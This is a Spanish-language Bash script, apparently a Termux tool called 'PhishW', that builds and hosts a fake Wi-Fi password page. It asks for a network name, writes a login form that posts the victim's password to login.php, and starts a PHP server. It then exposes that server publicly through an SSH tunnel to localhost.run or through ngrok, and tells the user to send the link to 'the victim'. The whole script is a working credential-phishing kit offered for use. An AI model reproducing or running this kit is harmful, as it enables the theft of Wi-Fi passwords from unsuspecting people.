#! /bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which php >/dev/null; then
sleep 1
echo ""
echo -e "$blue(php)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(php)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando php ...\e[0m"
sleep 3
pkg install php -y
fi

#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi

clear
setterm -foreground green
figlet PhishW
echo ""
echo "=================Phishing================"
echo ""
echo -e -n "\e[1;34m[+]Introduce el nombre de la red wifi >>\e[0m \e[1;37m\e[0m"
read a
echo "
<!DOCTYPE html>
<html lang='es'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <meta http-equiv='X-UA-Compatible' content='ie=edge'>
  <title>Wifi $a</title>
  <link rel='stylesheet' href='style.css'>
  <link rel='icon' type='image/x-icon' href='favicon.ico'>
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css'/>
</head>
<body>
  <div class='wrapper'>
    <section class='form signup'>
      <header><FONT COLOR='gray'>$a</FONT><img src='D.png' width='43px' height='35px'></header>
      <form action='login.php'  method='POST'>
        <div class='field input'>
          <label>Contraseña</label>
          <input type='password' name="Clave" placeholder='introducir contraseña' required>
          <i class='fas fa-eye'></i>
        </div>
        <div class='SubmitBtn'>
          <center><input class='submitBtn' type='submit'  value='Conectar'></center>
        </div>
      </form>
      <div class='link'>Avanzado <a href='login.php'</a></div>
    </section>
  </div>

  <script src='pass-show-hide.js'></script>
</body>
</html>
" > index.html

sleep 1
echo -e -n "\e[1;34m[+]Escribe un puerto default.[4444] >>\e[0m \e[1;37m\e[0m"
read b
sleep 1
echo ""
while :
do
#MENU
#ESCOJER MENU
setterm -foreground green
echo "-----------------------------"
echo "| [1]. Montar servidor php  |"
echo "| [2]. Salir                |"
echo -n "OPCION >> "
read opcion
case $opcion in
1)
#! /bin/bash
setterm -foreground yellow
echo ""
echo "========================================="
echo "La Contraseña se guarda en el archivo txt"
echo "========================================="
while :
do
echo ""
setterm -foreground white
echo -e "\e[1;31ma\e[0m\e[1;34m)\e[0m\e[1;37mTunel SSH\e[0m     \e[1;31mb\e[0m\e[1;34m)\e[0m\e[1;37mNgrok manual\e[0m    \e[1;31mc\e[0m\e[1;34m)\e[0m\e[1;37mNgrok automatico\e[0m"
echo ""
setterm -foreground blue
echo -e -n "\e[1;34m[+]PhishW >>\e[0m \e[1;37m\e[0m"
read wifi
case $wifi in
a)
#! /bin/bash
echo ""
setterm -foreground cyan
echo "========================================="
echo "Enviale el link del túnel a la victima"
echo "========================================="
echo ""
php -S 0.0.0.0:$b & ssh -R 80:localhost:$b nokey@localhost.run -q -y
exit
;;
b)
echo ""
#! /bin/bash
echo -e "\e[1;34m=========\e[0m\e[1;37mEjecutando 0.0.0.0:$b\e[0m\e[1;34m==========\e[0m"
echo ""
echo -e "\e[1;34m=======\e[0m\e[1;37mUna ves abierto el puerto $b\e[0m\e[1;34m=====\e[0m"
echo ""
echo -e "\e[1;34m=========\e[0m\e[1;37mAbre una nueva session\e[0m\e[1;34m===========\e[0m"
echo ""
echo -e "\e[1;34m=============\e[0m\e[1;37mngrok http $b\e[0m\e[1;34m==============\e[0m"
echo ""
setterm -foreground cyan
php -S 0.0.0.0:$b
exit
;;
c)
echo ""
#! /bin/bash
echo -e "\e[1;32m[\e[0m\e[1;31m><\e[0m\e[1;32m]\e[0m\e[1;33mCargando link Ngrok ....\e[0m"
sleep 3
echo ""
php -S 0.0.0.0:$b & ngrok http $b
exit
;;
esac
done
;;
2)
#! /bin/bash
setterm -foreground cyan
echo "Bye"
exit
;;
esac 
done 
#
